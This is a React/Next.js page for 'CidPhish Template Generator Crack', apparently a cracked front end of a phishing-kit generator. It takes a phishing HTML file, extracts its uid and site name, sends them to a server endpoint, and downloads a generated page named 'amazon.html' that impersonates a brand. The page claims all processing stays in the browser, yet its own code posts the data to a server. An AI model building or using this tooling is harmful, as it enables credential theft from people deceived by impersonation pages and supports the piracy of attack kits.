"use client";
import { useState, useEffect } from "react";

export default function Home() {
  const [templates, setTemplates] = useState<string[]>([]);
  const [selectedTemplate, setSelectedTemplate] = useState("");
  const [htmlInput, setHtmlInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationResult, setVerificationResult] = useState<{
    isValid: boolean;
    message: string;
  } | null>(null);
  const [extractedData, setExtractedData] = useState<{
    uid: string;
    websiteName: string;
  } | null>(null);

  // Fetch templates on component mount
  useEffect(() => {
    fetchTemplates();
  }, []);

  // Auto-verify when HTML input changes
  useEffect(() => {
    if (htmlInput.trim()) {
      const timeoutId = setTimeout(() => {
        verifyTemplate();
      }, 500); // Debounce for 500ms

      return () => clearTimeout(timeoutId);
    } else {
      setVerificationResult(null);
      setExtractedData(null);
    }
  }, [htmlInput]);

  const fetchTemplates = async () => {
    try {
      const response = await fetch('/api/v1/template');
      const data = await response.json();
      
      if (data.success) {
        setTemplates(data.templates);
      } else {
        console.error('Failed to fetch templates:', data.error);
      }
    } catch (error) {
      console.error('Error fetching templates:', error);
    }
  };

  const extractUidAndWebsiteName = (htmlString: string) => {
    const uidMatch = htmlString.match(/const uid = "([^"]+)";/);
    const websiteNameMatch = htmlString.match(/const websiteName = "([^"]+)";/);
    
    return {
      uid: uidMatch ? uidMatch[1] : null,
      websiteName: websiteNameMatch ? websiteNameMatch[1] : null
    };
  };

  const verifyTemplate = () => {
    setIsVerifying(true);
    
    setTimeout(() => {
      const extracted = extractUidAndWebsiteName(htmlInput);
      
      if (extracted.uid && extracted.websiteName) {
        setVerificationResult({
          isValid: true,
          message: "Template verified successfully! Ready for generation."
        });
        setExtractedData({
          uid: extracted.uid,
          websiteName: extracted.websiteName
        });
      } else {
        setVerificationResult({
          isValid: false,
          message: "Invalid template format. Please check your HTML structure."
        });
        setExtractedData(null);
      }
      
      setIsVerifying(false);
    }, 300);
  };

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.type === 'text/html') {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target?.result as string;
        setHtmlInput(content);
      };
      reader.readAsText(file);
    } else {
      alert('Please select a valid HTML file');
    }
  };

  const generateTemplate = async () => {
    if (!selectedTemplate || !extractedData) {
      alert('Please select a template and ensure your HTML is verified');
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/v1/template', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          templateName: selectedTemplate,
          uid: extractedData.uid,
          websiteName: extractedData.websiteName
        })
      });

      if (response.ok) {
        // Get the HTML content as blob
        const blob = await response.blob();
        
        // Create download link with amazon filename
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = `amazon.html`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        // Show success message without revealing details
        alert('File generated and downloaded successfully!');
      } else {
        const errorData = await response.json();
        alert(`Generation failed. Please try again.`);
      }
    } catch (error) {
      console.error('Error generating template:', error);
      alert('Generation failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const clearAll = () => {
    setSelectedTemplate("");
    setHtmlInput("");
    setVerificationResult(null);
    setExtractedData(null);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-purple-950 to-indigo-950 text-white relative overflow-hidden">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-cyan-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-300"></div>
        <div className="absolute top-40 left-40 w-60 h-60 bg-pink-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-700"></div>
      </div>

      {/* Grid Pattern Overlay */}
      <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZGVmcz48cGF0dGVybiBpZD0iZ3JpZCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBwYXR0ZXJuVW5pdHM9InVzZXJTcGFjZU9uVXNlIj48cGF0aCBkPSJtIDQwIDAgbCAwIDQwIG0gMCAtNDAgbCAtNDAgMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMzMzIiBzdHJva2Utd2lkdGg9IjEiLz48L3BhdHRlcm4+PC9kZWZzPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjZ3JpZCkiLz48L3N2Zz4=')] opacity-10"></div>

      <div className="relative z-10 max-w-7xl mx-auto p-6">
        {/* Header */}
        <header className="text-center py-12 mb-8">
          <div className="relative">
            <h1 className="text-6xl md:text-7xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-purple-400 to-pink-400 mb-6 tracking-tight">
              CidPhish
            </h1>
            <div className="text-2xl md:text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-red-400 mb-4">
              Template Generator Crack
            </div>
            <div className="flex items-center justify-center space-x-4 text-emerald-300">
              <div className="flex items-center space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></div>
                <span className="text-sm font-semibold">Secure</span>
              </div>
              <div className="w-1 h-4 bg-gray-600"></div>
              <div className="flex items-center space-x-2">
                <div className="w-2 h-2 bg-purple-400 rounded-full animate-pulse delay-150"></div>
                <span className="text-sm font-semibold">Anonymous</span>
              </div>
              <div className="w-1 h-4 bg-gray-600"></div>
              <div className="flex items-center space-x-2">
                <div className="w-2 h-2 bg-cyan-400 rounded-full animate-pulse delay-300"></div>
                <span className="text-sm font-semibold">No Logs</span>
              </div>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="space-y-8">
          <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
            
            {/* Left Side - HTML Upload */}
            <div className="space-y-6">
              <div className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 backdrop-blur-xl rounded-2xl p-8 border border-slate-700/50 shadow-2xl">
                <div className="flex items-center space-x-3 mb-6">
                  <div className="w-10 h-10 bg-gradient-to-r from-orange-500 to-red-500 rounded-lg flex items-center justify-center">
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-red-400">
                    Upload Source Template
                  </h2>
                </div>
                
                {/* File Upload */}
                <div className="mb-6">
                  <label className="block text-sm font-semibold mb-3 text-gray-300">
                    Select HTML File:
                  </label>
                  <div className="relative">
                    <input
                      type="file"
                      accept=".html,.htm"
                      onChange={handleFileUpload}
                      className="w-full p-4 bg-slate-800/80 border-2 border-dashed border-slate-600 hover:border-orange-500 rounded-xl text-white transition-all duration-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:bg-gradient-to-r file:from-orange-500 file:to-red-500 file:text-white file:font-semibold hover:file:from-orange-600 hover:file:to-red-600 file:transition-all file:duration-300 cursor-pointer"
                    />
                  </div>
                </div>

                {/* Text Area */}
                <div className="mb-6">
                  <label className="block text-sm font-semibold mb-3 text-gray-300">
                    Or paste HTML content:
                  </label>
                  <div className="relative">
                    <textarea
                      value={htmlInput}
                      onChange={(e) => setHtmlInput(e.target.value)}
                      placeholder="Paste your HTML content here..."
                      className="w-full h-72 p-4 bg-slate-800/80 border-2 border-slate-600 hover:border-purple-500 focus:border-purple-400 rounded-xl text-white placeholder-gray-400 font-mono text-sm resize-none transition-all duration-300 focus:ring-2 focus:ring-purple-400/50 focus:outline-none"
                    />
                    <div className="absolute bottom-3 right-3 text-xs text-gray-500">
                      {htmlInput.length} characters
                    </div>
                  </div>
                </div>

                {/* Auto-Verification Status */}
                {isVerifying && (
                  <div className="p-4 rounded-xl bg-gradient-to-r from-blue-900/80 to-indigo-900/80 border border-blue-500/50 mb-6 backdrop-blur-sm">
                    <div className="flex items-center">
                      <div className="relative">
                        <div className="w-5 h-5 border-2 border-blue-300 border-t-transparent rounded-full animate-spin mr-3"></div>
                      </div>
                      <span className="font-semibold">Analyzing template...</span>
                    </div>
                  </div>
                )}

                {/* Verification Result */}
                {verificationResult && !isVerifying && (
                  <div className={`p-6 rounded-xl mb-6 backdrop-blur-sm border-2 transition-all duration-500 ${
                    verificationResult.isValid 
                      ? 'bg-gradient-to-r from-emerald-900/80 to-green-900/80 border-emerald-500/50' 
                      : 'bg-gradient-to-r from-red-900/80 to-rose-900/80 border-red-500/50'
                  }`}>
                    <div className="flex items-center mb-3">
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center mr-3 ${
                        verificationResult.isValid ? 'bg-emerald-500' : 'bg-red-500'
                      }`}>
                        {verificationResult.isValid ? (
                          <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                          </svg>
                        ) : (
                          <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                          </svg>
                        )}
                      </div>
                      <span className="font-bold text-lg">
                        {verificationResult.isValid ? 'Template Valid' : 'Template Invalid'}
                      </span>
                    </div>
                    <p className="text-sm opacity-90">{verificationResult.message}</p>
                  </div>
                )}

                {/* Clear Button */}
                <button
                  onClick={clearAll}
                  className="w-full bg-gradient-to-r from-slate-700 to-slate-600 hover:from-slate-600 hover:to-slate-500 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-300 flex items-center justify-center space-x-2 group"
                >
                  <svg className="w-5 h-5 group-hover:animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                  </svg>
                  <span>Clear All</span>
                </button>
              </div>
            </div>

            {/* Right Side - Template Selection */}
            <div className="space-y-6">
              <div className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 backdrop-blur-xl rounded-2xl p-8 border border-slate-700/50 shadow-2xl">
                <div className="flex items-center space-x-3 mb-6">
                  <div className="w-10 h-10 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-lg flex items-center justify-center">
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-400">
                    Select Target Template
                  </h2>
                </div>
                
                {/* Show templates only if verification is successful */}
                {verificationResult?.isValid ? (
                  <>
                    {/* Template Selection */}
                    <div className="mb-8">
                      <label className="block text-sm font-semibold mb-3 text-gray-300">
                        Choose Target Template:
                      </label>
                      <select
                        value={selectedTemplate}
                        onChange={(e) => setSelectedTemplate(e.target.value)}
                        className="w-full p-4 bg-slate-800/80 border-2 border-slate-600 hover:border-emerald-500 focus:border-emerald-400 rounded-xl text-white transition-all duration-300 focus:ring-2 focus:ring-emerald-400/50 focus:outline-none appearance-none cursor-pointer"
                      >
                        <option value="">Select a template...</option>
                        {templates.map((template) => (
                          <option key={template} value={template}>
                            {template.charAt(0).toUpperCase() + template.slice(1)}
                          </option>
                        ))}
                      </select>
                    </div>

                    {/* Available Templates Grid */}
                    <div className="mb-8 p-6 bg-slate-800/50 rounded-xl border border-slate-600/50">
                      <h3 className="text-lg font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-400">
                        Available Templates ({templates.length})
                      </h3>
                      <div className="grid grid-cols-2 gap-3">
                        {templates.map((template) => (
                          <div
                            key={template}
                            className={`p-4 rounded-lg text-center text-sm font-semibold transition-all duration-300 cursor-pointer transform hover:scale-105 ${
                              selectedTemplate === template
                                ? 'bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg shadow-emerald-500/25'
                                : 'bg-slate-700/80 text-gray-300 hover:bg-slate-600/80 hover:text-white'
                            }`}
                            onClick={() => setSelectedTemplate(template)}
                          >
                            {template.charAt(0).toUpperCase() + template.slice(1)}
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Generate Button */}
                    <button
                      onClick={generateTemplate}
                      disabled={!selectedTemplate || isLoading}
                      className="w-full bg-gradient-to-r from-emerald-500 via-cyan-500 to-blue-500 hover:from-emerald-600 hover:via-cyan-600 hover:to-blue-600 disabled:from-gray-600 disabled:to-gray-700 text-white font-bold py-6 px-8 rounded-xl transition-all duration-300 disabled:cursor-not-allowed transform hover:scale-105 disabled:hover:scale-100 shadow-xl disabled:shadow-none relative overflow-hidden group"
                    >
                      <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/20 to-white/0 -skew-x-12 group-hover:animate-shimmer"></div>
                      {isLoading ? (
                        <span className="flex items-center justify-center relative z-10">
                          <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
                          Generating...
                        </span>
                      ) : (
                        <span className="flex items-center justify-center space-x-2 relative z-10">
                          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                          </svg>
                          <span>GENERATE & DOWNLOAD</span>
                        </span>
                      )}
                    </button>
                  </>
                ) : (
                  <div className="text-center py-16">
                    <div className="w-24 h-24 mx-auto mb-6 bg-gradient-to-r from-slate-700 to-slate-600 rounded-full flex items-center justify-center">
                      <svg className="w-12 h-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                    <h3 className="text-xl font-bold mb-3 text-gray-400">
                      Upload Required
                    </h3>
                    <p className="text-gray-500 max-w-md mx-auto">
                      Please upload and verify a valid HTML template to access generation features.
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-gradient-to-r from-slate-900/80 to-slate-800/80 backdrop-blur-xl rounded-2xl p-8 border border-slate-700/50 shadow-2xl">
            <div className="flex items-center space-x-4">
              <div className="w-12 h-12 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full flex items-center justify-center flex-shrink-0">
                <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
              </div>
              <div>
                <h3 className="text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-400 mb-2">
                  No Data is Stored In This Website
                </h3>
                <p className="text-gray-400">
                  All processing happens locally in your browser. Your templates and data never leave your device.
                </p>
              </div>
            </div> 
          </div>
        </main>

        {/* Footer */}
        <footer className="text-center py-8 mt-12 border-t border-slate-700/50">
          <p className="text-gray-400 text-lg">
            <span className="font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">
              CidPhish Template Generator Crack
            </span> 
            <span className="mx-2">•</span>
            <span className="text-sm">v1.0</span>
            <span className="mx-2">•</span>
            <span className="text-emerald-400 font-semibold">Secure & Private</span>
          </p>
        </footer>
      </div>

      <style jsx>{`
        @keyframes shimmer {
          0% {
            transform: translateX(-100%) skewX(-12deg);
          }
          100% {
            transform: translateX(200%) skewX(-12deg);
          }
        }
        .animate-shimmer {
          animation: shimmer 2s infinite;
        }
      `}</style>
    </div>
  );
}